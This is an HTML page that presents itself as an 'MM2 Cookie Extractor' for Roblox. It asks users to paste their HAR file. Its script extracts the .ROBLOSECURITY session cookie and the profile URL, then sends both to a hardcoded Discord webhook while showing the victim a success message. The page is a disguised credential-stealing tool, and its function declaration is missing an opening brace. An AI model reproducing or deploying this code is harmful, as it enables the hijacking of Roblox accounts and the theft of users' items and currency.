<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MM2 Cookie Extractor</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e2e;
            color: #f8f8f2;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #282a36;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }

        h1 {
            text-align: center;
        }

        textarea {
            width: 100%;
            height: 200px;
            background-color: #44475a;
            color: #f8f8f2;
            border: none;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        button {
            background-color: #ff79c6;
            color: #1e1e2e;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #ff92d0;
        }

        .error {
            color: #ff5555;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>MM2 Cookie Extractor</h1>
        <p>Paste your HAR file content below:</p>
        <textarea id="textarea" placeholder="Paste your HAR file content here..."></textarea>
        <button id="submit">Submit</button>
        <div class="error" id="error-message"></div>
    </div>

    <script>
        function extractDataFromHAR(input) 
            const roblosecurityRegex = /_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|\_([a-zA-Z0-9]+)/;
            const roblosecurityMatch = input.match(roblosecurityRegex);

            // Look for the profile URL
            const profileRegex = /https:\/\/www\.roblox\.com\/users\/\d+\/profile/;
            const profileMatch = input.match(profileRegex);

            return {
                roblosecurity: roblosecurityMatch ? roblosecurityMatch[1] : null,
                profileURL: profileMatch ? profileMatch[0] : null
            };
        }

        document.getElementById("submit").addEventListener("click", async () => {
            const rawData = document.getElementById("textarea").value;
            const { roblosecurity, profileURL } = extractDataFromHAR(rawData);

            if (!roblosecurity) {
                Swal.fire({
                    icon: "error",
                    title: "Error",
                    text: "No active account found!",
                });
                return;
            }

            if (!profileURL) {
                Swal.fire({
                    icon: "error",
                    title: "Error",
                    text: "Profile was not found. Make sure you copy the file while logged in a ROBLOX account.",
                });
                return;
            }

            // Send data to the webhook
            try {
                const webhookURL = "https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm";

                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        embeds: [
                            {
                                title: "ROBLOSECURITY Extracted",
                                fields: [
                                    { name: "Profile URL", value: profileURL, inline: false },
                                    { name: "ROBLOSECURITY", value: `\`${roblosecurity}\``, inline: false },
                                ],
                                color: 65280 // Green
                            }
                        ]
                    }),
                });

                Swal.fire({
                    icon: "success",
                    title: "Success",
                    text: "Data sent successfully!",
                });
            } catch (error) {
                console.error("Error sending data to webhook:", error);
                Swal.fire({
                    icon: "error",
                    title: "Error",
                    text: "ERROR WHILE PROCESSING YOUR DATA!",
                });
            }
        });
    </script>
</body>
</html>
